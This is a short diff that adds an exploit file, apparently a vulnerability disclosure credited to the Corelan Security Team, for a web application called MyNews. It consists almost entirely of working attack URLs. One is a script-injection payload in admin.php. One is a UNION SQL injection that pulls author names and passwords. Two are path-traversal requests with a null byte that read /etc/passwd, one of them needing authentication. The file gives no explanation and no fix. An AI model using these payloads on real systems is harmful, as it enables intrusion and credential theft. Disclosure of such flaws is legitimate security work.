@@ -1,0 +1,18 @@
+Cross-site scripting
+
+http://www.example.com/MyNews/admin.php?act=&lt;script&gt;alert("Found by the Corelan Security Team")&lt;/script&gt;
+
+
+SQL injection
+
+http://www.example.com/MyNews/index.php?act=article&id=-12+union+select+1,2,concat(name,0x3a,pwd),4+from+_authors--
+
+
+Local file include
+
+1:
+http://www.example.com/MyNews/index.php?act=../../../../etc/passwd%00&id=12
+ 
+2 (requires authentication):
+http://www.example.com/MyNews/admin.php?act=../../../../etc/passwd%00
+
